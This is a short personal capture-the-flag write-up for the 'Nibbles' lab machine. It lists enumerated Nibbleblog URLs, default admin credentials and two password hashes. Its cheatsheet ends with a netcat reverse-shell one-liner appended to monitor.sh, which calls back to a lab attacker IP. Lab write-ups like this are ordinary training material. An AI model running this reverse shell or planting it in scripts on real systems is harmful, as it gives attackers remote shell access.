# Nibbles \[Easy]

How did i lose my shit while doing this lol I focused on atom cms so much I didnt even bother looking up nibbleblog.

```
FAILED TO PERFORM FULL DIRECTORY FUZZING AGAIN - COULDNT FIND VERSION AS A RESULT BIG FAILURE
```

admin:nibbles is also crazy work but maybe thats the defaut creds and ill never cus my sorry ass never got to looking it up in the first place.

## Cheatsheet

```
<!-- /nibbleblog/ directory. Nothing interesting here! -->
http://10.10.10.134/nibbleblog/feed.php

var HTML_PATH_ROOT = "/nibbleblog/";var HTML_PATH_ADMIN = "/nibbleblog/admin/";var HTML_PATH_ADMIN_AJAX = "/nibbleblog/admin/ajax/";var HTML_PATH_ADMIN_JS = "/nibbleblog/admin/js/";var HTML_PATH_ADMIN_TEMPLATES = "/nibbleblog/admin/templates/";var _MAX_FILE_SIZE = 1024 * 3000;

http://10.10.10.75/nibbleblog/admin.php?controller=post&action=new_simple

http://10.10.10.75/nibbleblog/index.php?page=users&id=1
one part of exploit
Nibbleblog security error - Blacklist protection

http://10.10.10.75/nibbleblog/README

echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.17 9001 >/tmp/f" >> monitor.sh
```

## Loot

### Creds

admin:nibbles \[Guesswork]

```
062f706ac607ff314a3bc31e28b79394
255948160a9e032e28ada9cec73caa36
```
